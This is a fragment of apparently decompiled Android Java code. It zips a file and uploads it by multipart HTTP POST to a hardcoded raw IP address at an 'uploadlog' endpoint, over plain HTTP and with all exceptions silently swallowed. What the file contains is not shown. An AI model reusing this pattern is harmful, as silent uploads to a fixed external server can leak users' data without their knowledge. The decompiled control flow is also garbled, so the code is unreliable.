                                        if (zipOutputStream != null) {
                                            zipOutputStream.close();
                                        }
                                        this.mLogHttpClient.newCall(new Request.Builder().url("http://49.233.195.188:15000/api/uploadlog").post(new MultipartBody.Builder().setType(MultipartBody.FORM).addFormDataPart("file", file.getName(), RequestBody.create(MediaType.parse("application/from-data"), file)).build()).build()).enqueue(callback);
                                    } catch (Throwable th) {
                                        th = th;
                                        bufferedInputStream = bufferedInputStream2;
                                        if (bufferedInputStream != null) {
                                            bufferedInputStream.close();
                                        }
                                        if (zipOutputStream != null) {
                                            zipOutputStream.close();
                                        }
                                        throw th;
                                    }
                                }
                            }
                        } catch (Exception e2) {
                            e = e2;
                        }
                    } catch (Exception e3) {
                        e = e3;
                        zipOutputStream = null;
                    } catch (Throwable th2) {
                        th = th2;
                        zipOutputStream = null;
                    }
                    zipOutputStream.close();
                    this.mLogHttpClient.newCall(new Request.Builder().url("http://49.233.195.188:15000/api/uploadlog").post(new MultipartBody.Builder().setType(MultipartBody.FORM).addFormDataPart("file", file.getName(), RequestBody.create(MediaType.parse("application/from-data"), file)).build()).build()).enqueue(callback);
                } catch (Exception unused) {
                }
            } catch (Throwable th3) {
                th = th3;
            }
        } catch (Exception unused2) {
        }
    }
}
